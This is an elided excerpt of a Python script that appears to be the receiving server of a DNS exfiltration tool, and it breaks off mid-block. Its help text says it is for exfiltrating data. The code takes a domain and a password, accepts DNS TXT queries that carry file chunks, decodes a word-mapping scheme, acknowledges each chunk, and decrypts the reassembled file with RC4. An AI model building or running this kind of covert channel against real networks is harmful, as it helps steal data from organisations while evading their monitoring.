...
if __name__ == '__main__':
    ...
    parser.add_argument(
        "-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
    parser.add_argument(
        "-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password",
        required=True)
        ...
        while True:
            ...
            if request.q.qtype == 16:
                ...
                if qname.upper().startswith("INIT."):
                    ...
                    print('Received initial message: ', msg)
                    # Name of the file being exfiltrated
                    fileName = msg.split('|')[0]
                    # Total number of chunks of data expected to receive
                    nbChunks = int(msg.split('|')[1])
                    # Mapping to words?
                    mapWords = msg.split('|')[2] == 'True'
                    ...
                    if mapWords:
                        print(color("[+] Words are mapped"))
                    else:
                        print(color("[+] Words are NOT mapped"))
                ...
                # Else, start receiving the file, chunk by chunk
                    ...
                    # Remove the top level domain name
                    ...
                    if int(chunkNumber) == chunkIndex:
                        tmpData = rawData.replace('.', '')
                        currentEntropy = entropy(tmpData)
                        entropies.append(currentEntropy)
                        print('Received query: ', tmpData)
                        print('Entropy: ', currentEntropy)
                        if mapWords:
                            rawData = ''
                            index = 0
                            while index < len(tmpData):
                                word = tmpData[index: index+3]
                                rawData += base32Alphabet[map.index(word)]
                                index += 3
                            tmpData = rawData
                    ...
                    reply.add_answer(
                        RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
                    udps.sendto(reply.pack(), addr)

                    # ---- Have we received all chunks of data ?
                    if chunkIndex == nbChunks:
                        print('Average entropy: ', statistics.mean(entropies))
                        print('\n')
                        try:
                            ...
                            print(color("[+] Decrypting using password [{}] and saving to output file [{}]".format(
                                args.password, outputFileName)))
                            with open(outputFileName, 'wb+') as fileHandle:
                                content = ""
                                if useBase32:
                                    content = rc4Decryptor.binaryDecrypt(bytearray(fromBase32(fileData)))
                                else:
                                    content = rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData)))
                                fileHandle.write(content)
                                fileHandle.close()
                                print(color("[+] Output file [{}] saved successfully".format(outputFileName)))

                            print('Content:')
                            with zipfile.ZipFile(outputFileName) as z:
